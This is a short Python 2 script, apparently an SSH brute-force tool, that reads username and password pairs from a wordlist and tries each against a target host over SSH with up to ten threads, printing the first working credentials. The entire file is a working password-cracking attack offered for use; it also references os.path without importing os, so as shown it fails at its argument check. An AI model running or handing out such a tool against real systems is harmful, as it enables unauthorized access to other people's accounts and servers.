#encoding: utf-8

import threading
import argparse
import sys
import pxssh

connect_lock = threading.Semaphore(value=10)
found_event = threading.Event()

def ssh_connect(host, port, user, password):
    try:
        _client = pxssh.pxssh()
        _client.login(host, user, port=port, password=password)
        _client.logout()
        print '[+] username:%s, password:%s' % (user, password)
        found_event.set()
        return True
    except BaseException as e:
        #print '[-] %s, %s, %s' % (user, password, str(e))
        return False
    finally:
        connect_lock.release()

def crack(host, port, wordbook):
    fhandler = open(wordbook, 'rb')
    for _line in fhandler:
        if found_event.isSet():
            break
        try:
            _user, _password = _line.strip().split()[:2]
            connect_lock.acquire()
            _th = threading.Thread(target=ssh_connect, args=(host, port, _user, _password))
            _th.start()
        except BaseException as e:
            print str(e)
    fhandler.close()

if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument('-T', '--target', help='crack target', default='localhost', type=str)
    _parser.add_argument('-P', '--port', help='crack port', default=22, type=int)
    _parser.add_argument('-W', '--wordbook', help='user & password workbook', type=str)

    _args = _parser.parse_args()

    if _args.wordbook is None or \
        not os.path.exists(_args.wordbook) or \
        not os.path.isfile(_args.wordbook):
        _parser.print_help()
        sys.exit(-1)

    crack(_args.target, _args.port, _args.wordbook)
